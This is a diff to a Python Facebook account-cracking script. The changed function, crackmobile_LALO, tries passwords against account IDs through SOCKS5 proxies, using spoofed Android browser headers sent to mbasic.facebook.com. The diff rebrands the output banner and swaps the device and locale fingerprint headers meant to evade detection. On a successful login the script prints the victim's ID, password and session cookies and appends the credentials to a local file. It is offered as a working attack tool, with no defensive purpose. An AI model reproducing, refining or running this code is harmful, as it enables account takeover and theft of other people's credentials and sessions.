@@ -2967,7 +2967,7 @@ def crackmobile_LALO(idf,pwv,nmf):
 	bi = random.choice(['\33[m'])
 	pers = loop*200/len(id2)
 	fff = '%'
-	sys.stdout.write(f"\r \x1b[1;32m[  \x1b[1;97mKILLER-M🌪️  \x1b[1;91m{loop}\x1b[1;93m＋\x1b[1;93m{len(id)}  \x1b[1;96mOK:{ok}  \x1b[1;96mCP:{cp}  ]"),
+	sys.stdout.write(f"\r \x1b[1;32m[  \x1b[1;97mRAWA-M🌪️  \x1b[1;91m{loop}\x1b[1;93m＋\x1b[1;93m{len(id)}  \x1b[1;96mOK:{ok}  \x1b[1;96mCP:{cp}  ]"),
 	ua = random.choice(ugen)
 	random.choice(ugen)
 	ua = random.choice(ugenxe)
@@ -2981,22 +2981,23 @@ def crackmobile_LALO(idf,pwv,nmf):
 			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update = {'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    'content-type': 'application/x-www-form-urlencoded',
-    'dpr': '1.75',
+    'dpr': '2.75',
     'origin': 'https://mbasic.facebook.com',
     'referer': 'https://mbasic.facebook.com/',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"SM-A326B"',
+    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"13.0.0"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': ua,
@@ -3008,22 +3009,23 @@ def crackmobile_LALO(idf,pwv,nmf):
 			koki+=' m_pixel_ratio=1.75; wd=412x814'
 			headers = {'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    'content-type': 'application/x-www-form-urlencoded',
-    'dpr': '1.75',
+    'dpr': '2.75',
     'origin': 'https://mbasic.facebook.com',
     'referer': 'https://mbasic.facebook.com/',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"SM-A326B"',
+    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"13.0.0"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': ua,
@@ -3041,7 +3043,7 @@ def crackmobile_LALO(idf,pwv,nmf):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m KILLER_𝐎𝐊 ID | {idf} PASS | {pw} \nCOOKIE | {kuki}')
+				print(f'\r\x1b[1;92m RaWa_𝐎𝐊 ID | {idf} PASS | {pw} \nCOOKIE | {kuki}')
 				os.system('espeak -a 300 " KILLER,   CRACKER,    OK"')
 				open('/sdcard/LALO-OK.txt','a').write(f'{idf}|{pw}\n')
 				cek_LALO(kuki)
